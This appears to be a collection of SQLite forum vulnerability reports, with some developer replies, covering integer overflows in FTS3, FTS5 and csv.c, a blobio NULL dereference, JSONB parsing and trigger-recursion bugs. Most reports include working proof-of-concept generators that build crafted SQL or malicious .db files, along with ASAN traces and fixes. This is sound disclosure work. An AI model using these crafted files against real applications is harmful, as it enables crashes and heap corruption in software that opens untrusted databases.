nVal = (size_t)pInfo->nCol * pInfo->nPhrase;
break;
case FTS3_MATCHINFO_LHITS_BM:                       /* line 1030, 'b' */
nVal = (size_t)pInfo->nPhrase * ((pInfo->nCol + 31) / 32);
break;
default:
assert( cArg==FTS3_MATCHINFO_HITS );              /* line 1035, 'x' */
nVal = (size_t)pInfo->nCol * pInfo->nPhrase * 3;
break;

The (size_t) cast widens the first operand to size_t, which is 32 bits on 32-bit platforms. When nCol * nPhrase * 3 exceeds 2^32, the product wraps to a small value that flows into fts3MIBufferNew() as the requested element count. That allocator returns a tiny buffer. fts3MatchinfoValues() then iterates over the full pre-wrap nCol * nPhrase * 3 phrase-column pairs and writes a u32 per pair, walking far past the allocation. The same wrap-then-overflow pattern is present in the 'y' (LHITS, line 1026) and 'b' (LHITS_BM, line 1030) cases.

Two preconditions limit reachability:

32-bit build. size_t is 64-bit on every common 64-bit platform, so the product cannot wrap from any column or phrase count permitted by SQL.
SQLITE_FTS3_MAX_EXPR_DEPTH raised to 20. The default depth of 12 caps the OR expression tree at 2^12 - 1 = 4095 phrase leaves and the maximum product at 3 * 1994 * 4095 = 24,496,290, which is 175x below 2^32. Raising the limit to 20 lets the parser accept up to 2^20 - 1 = 1,048,575 phrases, and ceil(log2(717,984)) = 20 is exactly the depth needed for the minimum overflowing input.

With nCol = 1994 (the FTS3 column ceiling before too many columns on t) and nPhrase = 717,984 (ceil(2^32 / (3 * 1994))), the product 4,294,980,288 wraps to 12,992, the allocator returns a roughly 103 KB buffer, and the value-writer attempts to fill the full 4.29 billion entries (~17 GB of writes). ASAN aborts on the first write past the buffer.

PoC
Build the 32-bit ASAN target with SQLITE_FTS3_MAX_EXPR_DEPTH=20 and ICU, using the same toolchain Vuln51/52 use (gcc-15 via /data/ylwang/LargeScan/targets/sqlite32/gcc15/gcc15):
../configure \
--prefix=/data/ylwang/LargeScan/targets/sqlite/install32 \
--build=i686-linux-gnu --host=i686-linux-gnu \
--enable-debug --enable-fts5 --disable-tcl \
CC="/data/ylwang/LargeScan/targets/sqlite32/gcc15/gcc15 -m32" \
CFLAGS="-O0 -g \
-fsanitize=address,undefined,signed-integer-overflow \
-fno-sanitize-recover=all -fno-omit-frame-pointer \
-DSQLITE_MAX_SQL_LENGTH=2100000000 \
-DSQLITE_MAX_LENGTH=2100000000 \
-DSQLITE_FTS3_MAX_EXPR_DEPTH=20 \
-DSQLITE_ENABLE_ICU \
-I${ICU32}/usr/include" \
LDFLAGS="-fsanitize=address,undefined \
-L${ICU32}/usr/lib/i386-linux-gnu \
-Wl,-rpath,${ICU32}/usr/lib/i386-linux-gnu \
-licui18n -licuuc -licudata"
make -j$(nproc) && make install

Generator (vuln_001_gen.py):
#!/usr/bin/env python3
import os
NCOL    = 1994      # FTS3 column ceiling before "too many columns on t"
NPHRASE = 717984    # ceil(2^32 / (3*NCOL)), the minimum overflow point
product = NCOL * NPHRASE * 3
print(f"3 * {NCOL} * {NPHRASE} = {product:,}  ->  wraps to {product & 0xFFFFFFFF:,}")

cols = ", ".join(f"c{i}" for i in range(NCOL))
vals = ", ".join(["'w'"] + ["''"] * (NCOL - 1))
match_expr = " OR ".join(["w"] * NPHRASE)

out = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_001.sql")
with open(out, "w") as f:
f.write(f"CREATE VIRTUAL TABLE t USING fts3({cols});\n")
f.write(f"INSERT INTO t VALUES ({vals});\n")
f.write(f"SELECT 'matchinfo_length='||length(matchinfo(t, 'x'))"
f" FROM t WHERE t MATCH '{match_expr}';\n")
f.write(".quit\n")
print(f"Wrote {out} ({os.path.getsize(out)/1e6:.1f} MB)")

Run on the 32-bit binary:
python3 vuln_001_gen.py     # produces vuln_001.sql, about 3.4 MB
./sqlite3 < vuln_001.sql

ASAN output:
=================================================================
==696501==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xd4d19e28
WRITE of size 4 at 0xd4d19e28 thread T0
#0 sqlite3Fts3EvalPhraseStats     sqlite3.c:199077
#1 fts3ExprGlobalHitsCb            sqlite3.c:210258
#2 fts3ExprIterate2                sqlite3.c:209568
... (recursive walk of the 20-deep OR tree) ...
#23 sqlite3Fts3ExprIterate         sqlite3.c:209590
#24 fts3MatchinfoValues            sqlite3.c:210637
#25 fts3GetMatchinfo               sqlite3.c:210725
#26 sqlite3Fts3Matchinfo           sqlite3.c:211076
#27 fts3MatchinfoFunc              sqlite3.c:196906
#28 sqlite3VdbeExec                sqlite3.c:104450
#29 sqlite3Step                    sqlite3.c:93460
#30 sqlite3_step                   sqlite3.c:93521

0xd4d19e28 is located 0 bytes after 103976-byte region [0xd4d00800,0xd4d19e28)
allocated by thread T0 here:
#0 in malloc
#1 sqlite3MemMalloc                sqlite3.c:28098
#4 sqlite3_malloc64                sqlite3.c:31836
#5 sqlite3Fts3MallocZero           sqlite3.c:199977
#6 fts3MIBufferNew                 sqlite3.c:209444   (= ext/fts3/fts3_snippet.c)
#7 fts3GetMatchinfo                sqlite3.c:210708

The 103,976-byte allocation matches the wrapped 12,992 * 8 byte slot plus header padding, and the first OOB write at offset 103,976 is the boundary between the legitimate region and the next byte. The allocator stack ends in fts3MIBufferNew, which is exactly the call site sized by the overflowed nVal.

Fix
Compute nVal in 64-bit so the product cannot wrap at any reachable nCol/nPhrase, and cap the result against SQLITE_MAX_LENGTH/pInfo->nCol*pInfo->nPhrase*3 budget:
case FTS3_MATCHINFO_LHITS:
nVal = (i64)pInfo->nCol * pInfo->nPhrase;
break;
case FTS3_MATCHINFO_LHITS_BM:
nVal = (i64)pInfo->nPhrase * ((pInfo->nCol + 31) / 32);
break;
default:
assert( cArg==FTS3_MATCHINFO_HITS );
nVal = (i64)pInfo->nCol * pInfo->nPhrase * 3;
break;

fts3MatchinfoSize already returns size_t, but the multiplications now happen in i64 and the result is converted at the assignment, so the wrap is eliminated on every platform. A defensive complement is to reject huge phrase counts at the parser when nPhrase * nCol > SQLITE_MAX_LENGTH / 4, so even a custom-MAX_EXPR_DEPTH build cannot drive the allocator to absurd sizes.
```

title: Vuln59-40: FTS5 fts5StructureDecode 32-bit Integer Overflow in nTotal Allocation Causes Heap OOB Write

posts.author: ylwang (yuelinwang)
posts.body:
Summary
*prove sink methodlogy.

In ext/fts5/fts5_index.c at fts5StructureDecode() lines 1168 to 1170, each FTS5 level allocates its segment array as nTotal * sizeof(Fts5StructureSegment). The product is computed in the caller's argument type before the call, so on a 32-bit build it wraps modulo 2^32 before reaching the allocator.
i += fts5GetVarint32(&pData[i], nTotal);              /* 1166  nTotal from blob  */
if( nTotal<pLvl->nMerge ) rc = FTS5_CORRUPT;
pLvl->aSeg = (Fts5StructureSegment*)sqlite3Fts5MallocZero(&rc,
nTotal * sizeof(Fts5StructureSegment)              /* 1169  wraps on 32-bit  */
);

nTotal is the per-level segment count decoded from the FTS5 structure record stored at rowid=10 of the %_data shadow table. There is no per-level upper bound. The only ceiling check (nSegment <= FTS5_MAX_SEGMENT) applies to the global segment count field in the header, not to any individual level's count. On 32-bit builds both nTotal (type int) and sizeof(Fts5StructureSegment) (type size_t, 4 bytes wide) are 32-bit quantities, so an attacker who picks nTotal = 178956971 walks the multiplication into a 16-byte allocation.
178956971 * 48 = 8589934608  =>  (u32) = 16 bytes allocated

sqlite3Fts5MallocZero returns the 16-byte buffer. The decoding loop at lines 1176 to 1198 then reads segment records from the blob and writes each one into aSeg[i] at offset i * 48. The second segment write (aSeg[1]) lands at offset 48, which is 32 bytes past the end of the allocation, producing a heap buffer overflow with attacker-controlled content.

On 64-bit builds size_t is 8 bytes, so the multiplication does not wrap. sqlite3Fts5MallocZero receives the true 8.5 GB request, returns SQLITE_NOMEM, and the caller reports SQLITE_CORRUPT. No memory is corrupted.

The attack vector is a malicious .db file carrying a crafted structure blob at t_data.id=10. Any FTS5 query against the table decodes the structure on first use, so a single SELECT issued through the stock CLI is enough.

PoC
Python generator (audit-results/poc/ext_fts5_fts5Int/vuln_001_gen.py) builds an ordinary FTS5 database, then overwrites the structure record at t_data.id=10 with a crafted blob whose per-level nTotal triggers the 32-bit multiplication wrap:
#!/usr/bin/env python3
import os, sqlite3, struct

DB_PATH = "vuln_001.db"
N_TOTAL_OVERFLOW = 178956971    # 178956971 * 48 mod 2^32 == 16 bytes
SEG1_ISEGID      = 500          # 0x1F4, observed as crash address 0x1FC = 0x1F4 + 8

def encode_varint(n):
"""FTS5 base-128 varint (big-endian, MSB-set continuation)."""
assert 0 <= n <= 0x7FFFFFFF
groups = []
while True:
groups.append(n & 0x7f)
n >>= 7
if n == 0: break
groups.reverse()
return bytes((0x80 | g) if i < len(groups) - 1 else g
for i, g in enumerate(groups))

def build_structure_blob():
# Header: cookie(4 LE) | nLevel | nSegment | nWriteCounter
# nSegment in header is bounded by FTS5_MAX_SEGMENT=2000, set to 1.
# The per-level nTotal field has NO upper bound -- that is the bug.
header = (struct.pack("<I", 1)
+ encode_varint(1)                  # nLevel
+ encode_varint(1)                  # nSegment (passes the only ceiling)
+ encode_varint(1))                 # nWriteCounter
# Level 0: nMerge=0, nTotal=overflow
level_hdr = encode_varint(0) + encode_varint(N_TOTAL_OVERFLOW)
# Two segments. seg0 fills aSeg[0] in-bounds. seg1 writes aSeg[1] at
# heap offset 48, which is 32 bytes past the 16-byte allocation.
segs_data = (
encode_varint(1)           + encode_varint(1) + encode_varint(1)
+ encode_varint(SEG1_ISEGID) + encode_varint(1) + encode_varint(1)
)
return header + level_hdr + segs_data

if os.path.exists(DB_PATH):
os.unlink(DB_PATH)
con = sqlite3.connect(DB_PATH)
con.execute("CREATE VIRTUAL TABLE t USING fts5(content)")
con.execute("INSERT INTO t VALUES('hello world')")
con.commit()                                              # finalise honest structure first
con.execute("UPDATE t_data SET block = ? WHERE id = 10", (build_structure_blob(),))
con.commit()                                              # then patch the structure record
con.close()
print(f"wrote {DB_PATH}")

Run:
cd audit-results/poc/ext_fts5_fts5Int
python3 vuln_001_gen.py
../../../build32/sqlite3 vuln_001.db "SELECT * FROM t('hello');"

Trigger output on the 32-bit ASAN+UBSan build:
AddressSanitizer:DEADLYSIGNAL
==4017133==ERROR: AddressSanitizer: SEGV on unknown address 0x000001fc
==4017133==The signal is caused by a READ memory access.
==4017133==Hint: address points to the zero page.
#0 clearAllSharedCacheTableLocks  sqlite3.c:72625
#1 btreeEndTransaction            sqlite3.c:76501
#2 sqlite3BtreeRollback           sqlite3.c:76705
#3 sqlite3RollbackAll             sqlite3.c:188051

The crash address 0x000001fc directly tracks the attacker-supplied value. The PoC sets iSegid=500 (0x1F4) on the second segment. aSeg[1] lands at heap offset 48, 32 bytes past the end of the 16-byte allocation, and pSeg->iSegid is written there as a 4-byte little-endian int. The downstream code later reinterprets the 4 bytes at that slot as a struct Btree* and dereferences a member 8 bytes into the struct, giving the crash address 0x1F4 + 8 = 0x1FC. Changing iSegid from 2 to 500 in the generator shifts the crash address from 0x00000002 to 0x000001fc, confirming the write content is fully attacker-controlled. The 64-bit binary on the same input exits cleanly with out of memory, confirming the overflow is 32-bit specific.

Fix
Bound the per-level segment count before the allocation, and widen the multiplication so the size argument cannot wrap on 32-bit. The check belongs next to the existing nTotal<pLvl->nMerge guard at line 1167.
if( nTotal<pLvl->nMerge || nTotal<0 || nTotal>FTS5_MAX_SEGMENT ){
rc = FTS5_CORRUPT;
break;
}
pLvl->aSeg = (Fts5StructureSegment*)sqlite3Fts5MallocZero(&rc,
(i64)nTotal * sizeof(Fts5StructureSegment)
);

The (i64) cast removes the latent overflow even if a future change relaxes FTS5_MAX_SEGMENT. The added nTotal<0 test catches the signed-int corruption form, since fts5GetVarint32 will happily decode a 5-byte varint up to UINT32_MAX and assign it to a signed int.

title: Vuln60-41: blobio Extension readblob/writeblob NULL Column Argument Dereferences NULL Pointer in sqlite3StrICmp

posts.author: ylwang (yuelinwang)
posts.body:
Summary
In ext/misc/blobio.c at readblobFunc() line 55 and writeblobFunc() line 108, the guard that should reject a NULL column-name argument is written against the wrong variable. The same typo appears in both functions.
zTable  = (const char*)sqlite3_value_text(argv[1]);  /* line 49  / 102 */
if( zTable==0 ){ ... return; }                       /* line 50  / 103 correct */
zColumn = (const char*)sqlite3_value_text(argv[2]);  /* line 54  / 107 */
if( zTable==0 ){ ... return; }                       /* line 55  / 108 BUG */

A caller that passes SQL NULL as the column argument leaves zColumn=NULL. Since zTable is already non-NULL (the table-name guard at line 50/103 passed), the broken check is a no-op and sqlite3_blob_open(db, zSchema, zTable, NULL, ...) runs. Inside the engine, column-name resolution calls sqlite3StrIHash(NULL) which is NULL-safe and returns 0 at src/util.c:460, but the candidate-column scan then compares the resolved hash byte against each column's hName, and on a match calls the internal sqlite3StrICmp(aCol[i].zCnName, NULL). That entry point at src/util.c:423 has no NULL guard. The only public wrapper that does NULL-check both sides is sqlite3_stricmp at lines 418 to 421. The internal sqlite3StrICmp jumps straight to b = (unsigned char*)zRight then x = *b at line 430 and dereferences NULL.

The crash requires one extra condition to be steered into a hash collision. sqlite3StrIHash(NULL)=0 means the body of the loop only runs for columns whose own 8-bit case-insensitive hash equals zero. The PoC uses column name "aa>" whose UpperToLower['a'] + UpperToLower['a'] + UpperToLower['>'] = 97 + 97 + 62 = 256, which truncates to 0 in the u8 h accumulator. Without a hash-zero column, sqlite3_blob_open returns SQLITE_ERROR and the bug stays latent.

The extension is shipped as a CLI debugging aid under ext/misc/ and must be loaded with .load. The threat model is any environment where blobio.so is loaded (whether by the operator for debugging or by attacker SQL when extension loading is permitted) and any subsequent SQL can call readblob or writeblob with a NULL column argument.

PoC
Build the extension and run the trigger SQL through the ASAN+UBSan sqlite3 binary:
gcc -shared -fPIC -O2 \
-I/data/ylwang/LargeScan/targets/sqlite \
-I/data/ylwang/LargeScan/targets/sqlite/src \
-o blobio.so /data/ylwang/LargeScan/targets/sqlite/ext/misc/blobio.c

/data/ylwang/LargeScan/targets/sqlite/install/bin/sqlite3 <<'SQL'
.load ./blobio
CREATE TABLE t("aa>" BLOB);
INSERT INTO t VALUES(zeroblob(10));
SELECT readblob('main', 't', NULL, 1, 0, 5);
SQL

Trigger output:
sqlite3.c:36933:9: runtime error: load of null pointer of type 'unsigned char'

Line 36933 of the amalgamation is the x = *b inside sqlite3StrICmp, with b originating from the NULL zColumn passed through sqlite3_blob_open to sqlite3ColumnIndex. The matching column index i in the search loop is the column whose case-insensitive hash collides with zero, that is "aa>".

writeblobFunc has the identical bug at line 108. The trigger is the same shape, substituting SELECT writeblob('main', 't', NULL, 1, 0, x'00').

Fix
Change both guards to test the variable that was just assigned. The fix is mechanical and the pattern already appears in the surrounding code.
zColumn = (const char*)sqlite3_value_text(argv[2]);
if( zColumn==0 ){
sqlite3_result_error(context, "bad column name", -1);
return;
}

A defensive complement is to add a NULL guard at the top of the internal sqlite3StrICmp itself. The public wrapper sqlite3_stricmp already does so. Hardening the internal entry point would close the wider class of bugs where a NULL string reaches the comparator through any other caller.

title: Vuln61-42: CSV Virtual Table csvtabOpen 32-bit size_t Integer Overflow in nByte Allocation Causes Heap OOB

posts.author: ylwang (yuelinwang)
posts.body:
Summary
In ext/misc/csv.c at csvtabOpen() lines 712 to 718, the per-cursor allocation size is computed in size_t before the call to sqlite3_malloc64, so the multiplication wraps modulo 2^32 on a 32-bit build. The two pointer fields seated against the cursor head are then stepped by the unwrapped pTab->nCol, which lands aLen far outside the tiny allocation.
size_t nByte;
nByte = sizeof(*pCur) + (sizeof(char*)+sizeof(i64))*pTab->nCol;   /* 713 wraps  */
pCur = sqlite3_malloc64( nByte );                                  /* 714        */
if( pCur==0 ) return SQLITE_NOMEM;
memset(pCur, 0, nByte);
pCur->azVal = (char**)&pCur[1];                                    /* 717  OK    */
pCur->aLen  = (i64*)&pCur->azVal[pTab->nCol];                      /* 718  OOB   */

pTab->nCol is read from the columns=N argument of CREATE VIRTUAL TABLE ... USING csv(...). There is no upper bound on nCol other than the implicit INT_MAX of the parser. On a 32-bit platform sizeof(char*)+sizeof(i64) = 4+8 = 12, and the wrap target nCol = 357913944 (= (2^32)/12 + 3) is the smallest value that pushes the product just past the 32-bit boundary.
12 * 357913944 = 4294967328 = 0x100000020   =>  (size_t) = 0x20 = 32
nByte = sizeof(CsvCursor) + 32              (~312 bytes total)

sqlite3_malloc64 happily returns the ~312-byte chunk. Line 717 sets azVal to pCur + sizeof(CsvCursor), which is in bounds. Line 718 then computes &pCur->azVal[357913944], advancing the pointer by 4 * 357913944 = 1431655776 bytes (about 1.33 GB) past the allocation base. aLen now points at an unmapped or unrelated address. The first call to csvtabNext() reaches the read at line 743:
if( pCur->aLen[i] < pCur->rdr.n+1 ){           /* 743  OOB load  */

and dereferences the wild pointer. Even if the read happens to land on mapped memory, the subsequent write at line 751 (pCur->aLen[i] = pCur->rdr.n+1) hands the attacker a fully attacker-controlled i64 write at an attacker-influenced address (the table can declare many columns, and i advances per field).

The csvtabConnect path that builds the implicit schema string would normally OOM long before reaching csvtabOpen if nCol = 357M columns were materialized. The PoC bypasses that by passing an explicit schema='CREATE TABLE x(c1 TEXT)' parameter, which makes csvtabConnect accept columns=N verbatim without building any schema text.

On 64-bit builds size_t is 8 bytes wide. 12 * 357913944 = 4294967328 fits without wrapping, sqlite3_malloc64 is asked for a real ~4 GB allocation, returns NULL, and csvtabOpen returns SQLITE_NOMEM. No memory is corrupted.

Reachable through any SQL session that can call .load on csv.so (or where the extension is preloaded) and execute a CREATE VIRTUAL TABLE ... USING csv(...) statement. The bug is 32-bit specific.

PoC
Build a 32-bit copy of the CSV extension with the local gcc-15 wrapper, then drive the 32-bit ASAN sqlite3 binary against a trigger SQL script.
cd /data/ylwang/LargeScan/targets/sqlite/audit-results/poc/ext_misc_csv

/data/ylwang/LargeScan/targets/sqlite32/gcc15/gcc15 -m32 -shared -fPIC -O0 -g \
-I/data/ylwang/LargeScan/targets/sqlite \
-I/data/ylwang/LargeScan/targets/sqlite/src \
-o csv32.so /data/ylwang/LargeScan/targets/sqlite/ext/misc/csv.c

printf 'col1\nval1\n' > /tmp/test_csv_001.csv

/data/ylwang/LargeScan/targets/sqlite/install32/bin/sqlite3 <<'SQL'
.load ./csv32.so
CREATE VIRTUAL TABLE t USING csv(
filename='/tmp/test_csv_001.csv',
schema='CREATE TABLE x(c1 TEXT)',
columns=357913944
);
SELECT * FROM t;
SQL

Trigger output on the 32-bit ASAN build:
AddressSanitizer:DEADLYSIGNAL
==2303852==ERROR: AddressSanitizer: SEGV on unknown address 0x46a583bc
==2303852==The signal is caused by a READ memory access.
#0 csvtabNext     ext/misc/csv.c:743
#1 csvtabFilter   ext/misc/csv.c:834
#2 sqlite3VdbeExec
#3 sqlite3Step
...
SUMMARY: AddressSanitizer: SEGV ext/misc/csv.c:743 in csvtabNext

eax = 0x46a583b8 in the register dump is the wrapped aLen base. The crash address 0x46a583bc is exactly aLen + 4, which is the high 4 bytes of pCur->aLen[0] (an i64). Repointing the cursor to the same allocation under the 64-bit binary returns Parse error: csv: too many columns or SQLITE_NOMEM, confirming the overflow is 32-bit specific.

Fix
Widen the size expression to 64-bit at the call site, and bound the column count at parse time so a hostile columns=N cannot be accepted in the first place. Either change alone removes the bug. Applying both gives belt-and-braces hardening.
size_t nByte;
if( pTab->nCol > CSV_MAX_NCOL ){               /* parse-time bound  */
return SQLITE_ERROR;
}
nByte = sizeof(*pCur) + (sizeof(char*)+sizeof(i64))*(sqlite3_uint64)pTab->nCol;
pCur = sqlite3_malloc64( nByte );

Fixed by check-in ecae4a2ddf103fe5.

Because the csv.c extension is unused and unsupported, and because this issue
only arises on 32-bit builds (which hardly anybody uses anymore), there are
not plans to backport this fix to prior releases.  The fix will appears in

title: Vuln62-43: ALTER TABLE DROP CONSTRAINT Silently Retains DEFAULT, COLLATE and GENERATED Clause Values in the Stored Schema

posts.author: dan
posts.body:
Hi,

Sorry - I thought I posted an answer to this. I bet I previewed it and didn't press post...

Anyway, SQLite is operating as designed here. None of DEFAULT, COLLATE or GENERATED clauses
are constraints. Adding "CONSTRAINT mycons" in front of them doesn't change that. In some
ways it's a quirk of the syntax that it is allowed at all - but we can't change it because
of backwards compatibility. I suppose technically it creates an empty named constraint, separate from whatever follows it.
You can even do:
CREATE TABLE t1(a, b CONSTRAINT mycons);

So in the DEFAULT, COLLATE and GENERATED cases, SQLite is correct to just
remove the "CONSTRAINT consname" text.

Postgres has a similar quirk, btw. If you do:
CREATE TABLE t1(a INT PRIMARY KEY, b INT CONSTRAINT mycons DEFAULT 10);
ALTER TABLE DROP CONSTRAINT mycons;

Dan.

title: Vuln64-45: JSONB-to-Text Translator Discards Payload Size for NULL/TRUE/FALSE, Injecting Phantom Array Elements

posts.author: ylwang (yuelinwang)
posts.body:
Summary
In src/json.c at jsonTranslateBlobToText() lines 2206 to 2217, the three leaf-type cases JSONB_NULL, JSONB_TRUE, JSONB_FALSE return i+1 instead of return i+n+sz. jsonbPayloadSize() at line 2200 already decoded the full element width (n header bytes + sz payload bytes), but the leaf-type handlers hardcode a one-byte advance and drop the payload bytes back into the array walk. The walker then re-parses those bytes as additional elements.
n = jsonbPayloadSize(pParse, i, &sz);              /* 2200  correct n+sz       */
switch( pParse->aBlob[i] & 0x0f ){
case JSONB_NULL:  { jsonAppendRawNZ(pOut,"null", 4); return i+1; }  /* 2208 BUG */
case JSONB_TRUE:  { jsonAppendRawNZ(pOut,"true", 4); return i+1; }  /* 2212 BUG */
case JSONB_FALSE: { jsonAppendRawNZ(pOut,"false",5); return i+1; }  /* 2216 BUG */
case JSONB_INT: ...                              /* uses i+n+sz via break    */

JSONB encodes the element width in the high nibble of the first byte. A non-minimal encoding such as 0x10 declares "JSONB_NULL with one trailing payload byte". Other JSON1 entry points honor it: json_array_length() on the raw BLOB walks the structure via jsonbPayloadSize and counts correctly. But json() round-trips through the text translator, hits the buggy return i+1, and the orphaned payload byte is reinterpreted as a new element. The API surface fractures: the same BLOB reports a different array length depending on which JSON1 function the caller uses.

PoC/data/ylwang/LargeScan/targets/sqlite/install/bin/sqlite3 <<'SQL'
SELECT json(x'8b1000000000000000');
SELECT json_array_length(x'8b1000000000000000');
SELECT json_array_length(json(x'8b1000000000000000'));
SQL

Output:
[null,null,null,null,null,null,null,null]
7
8

The first line is the BLOB translated to text, eight null elements. The second line is the raw-BLOB length, seven elements (correct, line 1 byte 1 has 0x10 so it consumes bytes 1 to 2, leaving bytes 3 to 8 as six more minimal nulls). The third line is the same length query on the round-tripped text, which inherits the phantom element from line 1.

The 9-byte BLOB layout: 0x8b is JSONB_ARRAY with payload size 8, then byte 1 is 0x10 (non-minimal JSONB_NULL with one trailing payload byte), then six minimal 0x00 nulls.

Fix
The three leaf-type handlers must advance by the full element width, mirroring the INT/FLOAT cases that fall through to the common break path after appending text.
case JSONB_NULL:  { jsonAppendRawNZ(pOut,"null", 4); return i+n+sz; }
case JSONB_TRUE:  { jsonAppendRawNZ(pOut,"true", 4); return i+n+sz; }
case JSONB_FALSE: { jsonAppendRawNZ(pOut,"false",5); return i+n+sz; }

title: Vuln65-46: Compile-Time Trigger Chain Stack Overflow in `codeRowTrigger`

posts.author: ylwang (yuelinwang)
posts.body:
Summary
src/trigger.c:codeRowTrigger() eagerly compiles all nested triggers at prepare time through unbounded C recursion. When trigger tr_i on table t_i contains INSERT INTO t_{i+1}, compiling INSERT INTO t1 causes the call chain:
codeRowTrigger(tr1) → codeTriggerProgram → sqlite3Insert →
sqlite3CodeRowTrigger → codeRowTrigger(tr2) → ... → codeRowTrigger(tr_N)

Each level allocates a stack-local Parse sSubParse (416 bytes) plus frame locals for sqlite3Insert and friends, totalling roughly 1.3 KB of C stack per trigger. The runtime guard SQLITE_LIMIT_TRIGGER_DEPTH is checked only inside OP_Program in vdbe.c:7561 during sqlite3_step; it is never consulted during sqlite3_prepare_v2. A non-circular chain of N triggers therefore grows the C stack by N × 1.3 KB with no guardrail, causing SIGSEGV inside sqlite3_prepare_v2 before the caller reaches sqlite3_step.

The circular-trigger cache at trigger.c:1362 (pRoot->pTriggerPrg) deduplicates repeated compilation of the same trigger object, but each trigger in a linear chain is a distinct object, so no deduplication occurs.

Attack Vector
An attacker supplies a crafted .db file. Any application that opens the file and compiles a single INSERT INTO t1 statement — even without executing it — will crash. No SQL injection is required; opening the file and calling sqlite3_prepare_v2 is sufficient.

PoC
Step 1 — generate the malicious database file (gen_triggerchain.py):
#!/usr/bin/env python3
"""
Generate a malicious SQLite .db file containing a deep trigger chain.

When any application opens this file and compiles:
INSERT INTO t1 VALUES(1);
SQLite recursively compiles all N triggers at prepare time (no compile-time
depth guard), overflowing the C stack with SIGSEGV before step() is ever called.

Threshold on typical Linux (8 MB stack, -O0): ~5500 triggers
Threshold on this machine (12.5 MB stack):     ~8500 triggers
"""

import sqlite3
import os
import sys

N = int(sys.argv[1]) if len(sys.argv) > 1 else 9000
OUT = sys.argv[2] if len(sys.argv) > 2 else "/tmp/trigger_chain.db"

if os.path.exists(OUT):
os.remove(OUT)

con = sqlite3.connect(OUT)
cur = con.cursor()
cur.execute("PRAGMA journal_mode=OFF")

print(f"[*] Creating {N+1} tables...")
for i in range(1, N + 2):
cur.execute(f"CREATE TABLE t{i} (x INT)")

print(f"[*] Creating {N} AFTER INSERT triggers (t1→t2→...→t{N+1})...")
for i in range(1, N + 1):
cur.execute(
f"CREATE TRIGGER tr{i} AFTER INSERT ON t{i} "
f"BEGIN INSERT INTO t{i+1} VALUES(NEW.x); END"
)

con.commit()
con.close()

size = os.path.getsize(OUT)
print(f"[+] Done: {OUT}  ({size/1024/1024:.1f} MB, N={N})")
print()
print("To trigger the crash:")
print(f"  python3 -c \"import sqlite3; con=sqlite3.connect('{OUT}'); con.execute('INSERT INTO t1 VALUES(1)')\"")
print()
print("Or with the system sqlite3 CLI:")
print(f"  sqlite3 '{OUT}' 'INSERT INTO t1 VALUES(1)'")

Step 2 — generate the 9 000-trigger database (already present at /tmp/trigger_chain.db):
python3 gen_triggerchain.py 9000 /tmp/trigger_chain.db
# [+] Done: /tmp/trigger_chain.db  (36.8 MB, N=9000)

Step 3 — trigger the crash (victim opens file and compiles one INSERT):
# Via the sqlite3 CLI:
sqlite3 /tmp/trigger_chain.db 'INSERT INTO t1 VALUES(1)'

The process crashes with SIGSEGV inside sqlite3_prepare_v2; sqlite3_step is never reached.

Root Cause
trigger.c:1267 — codeRowTrigger allocates a fresh Parse sSubParse on the C stack and calls codeTriggerProgram, which compiles each trigger step. A step of the form INSERT INTO t_{i+1} invokes sqlite3Insert → sqlite3CodeRowTrigger → getRowTrigger → codeRowTrigger for the next trigger, recursing without bound.

Fix
Add a compile-time trigger nesting counter to the top-level Parse and check it in getRowTrigger before calling codeRowTrigger, mirroring the runtime check in vdbe.c:7561.

In src/sqliteInt.h, add one field to struct Parse:
int nTriggerDepth;   /* compile-time trigger nesting depth */

In src/trigger.c, inside getRowTrigger(), wrap the codeRowTrigger call:
Parse *pRoot = sqlite3ParseToplevel(pParse);
if( pRoot->nTriggerDepth >= db->aLimit[SQLITE_LIMIT_TRIGGER_DEPTH] ){
sqlite3ErrorMsg(pParse, "too many levels of trigger recursion");
return 0;
}
pRoot->nTriggerDepth++;
pPrg = codeRowTrigger(pParse, pTrigger, pTab, orconf);
pRoot->nTriggerDepth--;

sqlite3ParseObjectInit already zeroes the entire Parse struct, so nTriggerDepth requires no additional initialisation. The fix reuses SQLITE_LIMIT_TRIGGER_DEPTH (default 1000) so the compile-time and runtime limits stay in sync.

title: UPSERT RealAffinity Register Mapping Bug with Virtual Generated Columns

posts.author: dan
posts.body:
Thanks for this - this is another real correctness bug. Although one you would need a sharp eye to spot! Should now be fixed here:

https://sqlite.org/src/info/71334f7ec9

Dan.

posts.author: sdjasj
posts.body:
Summary
In SQLite's UPSERT implementation (src/upsert.c line 321), the code applies OP_RealAffinity to registers using column index order (pTop->regData+i) instead of storage order (pTop->regData+sqlite3TableColumnToStorage(pTab,i)). When a table has VIRTUAL generated columns appearing before a REAL-affinity column, the wrong register receives the OP_RealAffinity instruction. This converts an adjacent INT column's large integer value (exceeding 2^53) to a double, causing irreversible precision loss and producing incorrect query results.

Vulnerable Code
File: src/upsert.c, lines 318-323
/* excluded.* columns of type REAL need to be converted to a hard real */
for(i=0; i<pTab->nCol; i++){
if( pTab->aCol[i].affinity==SQLITE_AFF_REAL ){
sqlite3VdbeAddOp1(v, OP_RealAffinity, pTop->regData+i);  /* BUG: uses column index instead of storage index */
}
}

Correct code (following the pattern used in resolve.c line 582-583 for excluded.* column resolution):
sqlite3VdbeAddOp1(v, OP_RealAffinity, pTop->regData+sqlite3TableColumnToStorage(pTab,i));

The function sqlite3TableColumnToStorage() (defined in src/build.c line 1173) correctly maps column indices to storage indices, skipping VIRTUAL generated columns. It has a zero-overhead fast path for tables without virtual columns.

PoC-- Create table with VIRTUAL generated column before REAL column
CREATE TABLE t1(id INT PRIMARY KEY, v TEXT GENERATED ALWAYS AS ('x') VIRTUAL, r REAL, n INT);
INSERT INTO t1(id,r,n) VALUES(1, 0.5, 9007199254740993);

-- Trigger the bug via UPSERT
INSERT INTO t1(id,r,n) VALUES(1, 1.0, 9007199254740993)
ON CONFLICT(id) DO UPDATE SET r=excluded.r, n=excluded.n;

-- Expected: 9007199254740993 | Actual: 9007199254740992 (precision loss!)
SELECT n, typeof(n) FROM t1;

Register Layout Analysis
For the table t1(id INT PK, v TEXT VIRTUAL, r REAL, n INT):

Register
Storage Index
Column Index
Content

regData+0
0 (id)
0 (id)
id=1

regData+1
1 (r)
—
r=1.0 (REAL, should get RealAffinity)

regData+2
2 (n)
—
n=9007199254740993 (INT)

(skipped)
—
1 (v VIRTUAL)
NOT stored

